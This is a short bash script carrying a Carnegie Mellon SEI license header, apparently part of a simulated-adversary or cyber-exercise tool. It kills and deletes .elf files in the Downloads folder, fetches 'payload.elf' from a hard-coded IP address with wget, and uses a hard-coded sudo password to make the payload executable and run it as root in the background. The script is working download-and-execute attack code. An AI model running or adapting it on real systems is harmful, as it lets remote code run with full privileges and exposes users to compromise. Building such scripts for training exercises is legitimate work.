#!/bin/bash

# Copyright 2024 Carnegie Mellon University.
# Released under a MIT (SEI)-style license, please see LICENSE.md in the project 
# root or contact permission@sei.cmu.edu for full terms.


cd /home/user/Downloads

for file in *.elf
do
    pkill -f "$file"
done

rm -rf *.elf

wget -O payload.elf http://123.45.67.150
sleep 5

echo 'Ph1sh1ngK1ng#1' | sudo -S chmod 755 payload.elf
echo 'Ph1sh1ngK1ng#1' | sudo -S ./payload.elf &
